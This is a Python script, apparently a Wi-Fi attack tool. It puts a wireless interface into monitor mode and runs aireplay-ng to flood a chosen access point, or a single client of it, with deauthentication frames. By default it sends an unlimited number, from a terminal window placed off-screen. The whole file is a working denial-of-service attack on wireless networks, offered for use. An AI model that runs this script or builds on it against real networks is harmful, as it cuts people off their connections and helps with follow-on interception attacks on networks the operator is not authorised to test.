#!/usr/bin/env python3

import subprocess
import os 
from subprocess import PIPE
import argparse
import sys

class Deauth_Router:

      def __init__(self):
          self.args_Control()
          self.death_wifi()
      def death_wifi(self):    
          Snake_interface  = [
                               "sudo ifconfig wlansnake down",
                               "sudo iwconfig wlansnake mode Monitor",
                               "sudo ifconfig wlansnake up"
                             ]
          for _ in Snake_interface :
              set_airmon_snake = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
          if self.args.Target:
               if not self.args.Packet:
                  command = "sudo aireplay-ng --deauth 0  -a "+f'{self.args.Deauth} '+" -c "+f'{self.args.Target}'+" wlansnake "
               else:
                  command = "sudo aireplay-ng --deauth "+ f'{self.args.Packet}' " -a "+f'{self.args.Deauth} '+" -c "+f'{self.args.Target}'+" wlansnake "
          else:
              if not self.args.Packet:
                 command = "sudo aireplay-ng --deauth 0  -a "+f'{self.args.Deauth} '+" wlansnake"
              else:
                  command = "sudo aireplay-ng --deauth " +f'{self.args.Packet}' +" -a "+f'{self.args.Deauth} '+" wlansnake"
          command_proc = ' gnome-terminal --geometry 110x20+5000+1000  -e ' +'"' +  command   +" --ignore-negative-one"+'"'                  
          call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)                            
      def args_Control(self):
            parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
            parser.add_argument( '-I ',"--Interface" )               
            parser.add_argument( '-D ',"--Deauth")
            parser.add_argument( '-AP ',"--APName")
            parser.add_argument( '-T ',"--Target") 
            parser.add_argument( '-P ',"--Packet")
            parser.add_argument( '--dns',action='store_true')
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
                 pass
            else:
                 parser.print_help()
                 exit()                   
if __name__=='__main__':
    Deauth_Router()


